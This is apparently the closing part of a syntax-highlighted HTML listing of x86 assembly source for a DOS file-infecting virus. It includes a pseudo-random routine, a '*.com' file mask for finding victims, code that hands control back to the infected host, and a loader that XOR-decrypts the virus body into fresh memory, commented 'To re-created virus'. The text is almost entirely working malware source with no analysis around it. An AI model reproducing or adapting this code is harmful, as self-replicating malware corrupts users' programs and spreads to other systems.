        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0">  </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Rotate it</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">62e9h</span><span class="sc0">   </span><span class="sc1">; Add it</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3619h</span><span class="sc0">
                    </span><span class="sc1">; Store new value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">RandSeed</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; If we divide by maximum needed</span><span class="sc0">
                    </span><span class="sc1">; value , in Dx we would get</span><span class="sc0">
                    </span><span class="sc1">; number which in area of 0 &lt;-&gt; Limit</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">YeapLimit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NoLimit</span><span class="sc0">
</span><span class="sc5">YeapLimit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">NoLimit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">      </span><span class="sc1">; return modulus</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">getrnd</span><span class="sc0">      </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc5">fmask</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'*.com'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Quit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoHalt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">          </span><span class="sc1">; If we first time executed - just exit</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">NoHalt</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">BackTo</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">BackTo</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">             </span><span class="sc1">; Clear prefetch queue</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">BackTo</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">zTbl</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Storage for decryptor offset </span><span class="sc0">
</span><span class="sc5">Cnt</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Fend</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Storage for file end</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">xmm.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">surf.inc</span><span class="sc0">

</span><span class="sc5">Loader</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getpp</span><span class="sc0">          </span><span class="sc1">; This is loader</span><span class="sc0">
</span><span class="sc5">getpp</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getpp</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Blocks</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc5">Tbl</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get offset of block in table,</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; decrypt and copy it to new memory</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; location</span><span class="sc0">
</span><span class="sc5">LetsRest</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">Bx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">PVlen</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoAddD</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Lvlen</span><span class="sc0">
</span><span class="sc5">NoAddD</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">34h</span><span class="sc0">         </span><span class="sc1">; Xor al,ZZ</span><span class="sc0">
</span><span class="sc5">DPatch</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">NoAddD</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">LetsRest</span><span class="sc0">
    </span><span class="sc6">retf</span><span class="sc0">                </span><span class="sc1">; To re-created virus...</span><span class="sc0">
</span><span class="sc5">ldrl</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Loader</span><span class="sc0">

</span><span class="sc5">tbl</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">Blocks</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Vlen</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">main</span><span class="sc0">
</span><span class="sc5">pvlen</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">Vlen</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc5">Blocks</span><span class="sc0">
</span><span class="sc5">lvlen</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">Vlen</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc5">Pvlen</span><span class="sc0">

</span><span class="sc5">JmpP</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">; Storage for JMP offset</span><span class="sc0">

</span><span class="sc5">dta</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Fdate</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Flen</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">Fname</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">free</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">Ldrl</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Blocks</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Vlen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">StCrp</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">Pvlen</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">CrpAr</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">main</span></div></body>
</html>
